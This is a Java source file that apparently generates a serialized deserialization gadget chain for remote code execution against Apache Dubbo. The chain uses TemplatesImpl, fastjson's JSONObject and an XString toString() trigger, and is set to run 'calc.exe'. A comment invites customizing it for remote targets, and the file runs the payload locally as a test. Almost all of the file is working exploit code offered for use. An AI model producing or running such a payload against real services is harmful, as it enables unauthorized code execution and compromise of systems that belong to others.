package DubboGadget;

import com.alibaba.fastjson.JSONObject;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

public class DubboGadget {
    // Customize URL for remote targets

    public static String DUBBO_RCE_COMMAND = "calc.exe";

    public static void main(String[] args) throws Exception {
        byte[] gadgetBytes = RCEObjectPayload(DUBBO_RCE_COMMAND);
        printGadget(gadgetBytes);
        // Test gadget locally
        execGadget(gadgetBytes);
    }

    public static byte[] RCEObjectPayload(final String command) throws Exception {
        Object templates = Utils.createTemplatesImpl(command);  // TemplatesImpl gadget chain, which
                                                                // triggers Runtime.exec() on
                                                                // TemplatesImpl.newTransformer()
        JSONObject jo = new JSONObject();
        jo.put("oops",templates); // If JSONObject.toString() is called,
                                  // TemplatesImpl.newTransformer() will be invoked
        Object o = Utils.makeXStringToStringTrigger(jo); // toString() gadget chain, which
                                                         // triggers on OIS deserialization
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(o);
        byte[] gadgetBytes = baos.toByteArray();
        return gadgetBytes;
    }

    public static void printGadget(byte[] gadgetBytes) {
        System.out.println(new String(gadgetBytes));
    }

    public static void execGadget(byte[] gadgetBytes) throws Exception {
        // Show serialized gadget in console
        printGadget(gadgetBytes);
        ByteArrayInputStream bais = new ByteArrayInputStream(gadgetBytes);
        ObjectInputStream ois = new ObjectInputStream(bais);
        Object oopsie = ois.readObject();
        oopsie.toString();
    }
}

